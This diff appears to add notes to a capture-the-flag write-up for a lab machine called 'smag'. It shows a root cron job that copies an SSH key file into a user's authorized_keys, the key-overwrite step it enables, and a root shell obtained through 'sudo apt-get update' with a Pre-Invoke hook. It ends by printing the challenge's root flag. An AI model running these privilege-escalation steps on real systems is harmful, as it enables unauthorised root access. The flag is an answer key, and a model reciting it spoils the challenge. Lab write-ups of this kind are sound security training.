@@ -172,5 +172,37 @@ run reverse shell
 get access as www-date
 run linpease
 
+### Found in crontab
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+
+### generate and uplod own pub key
+
+get access as jake
+run linpeas
+
+jake@smag:/tmp$ sudo -l
+Matching Defaults entries for jake on smag:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+
+jake@smag:/tmp$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+root@smag:/tmp# whoami
+root
+root@smag:/tmp# cd ..
+root@smag:/# cd root
+root@smag:/root# ls
+root.txt
+root@smag:/root# cat root.txt
+uJr6zRgetaniyHVRqqL58uRasybBKz2T
+
+
+
 
 <\code>
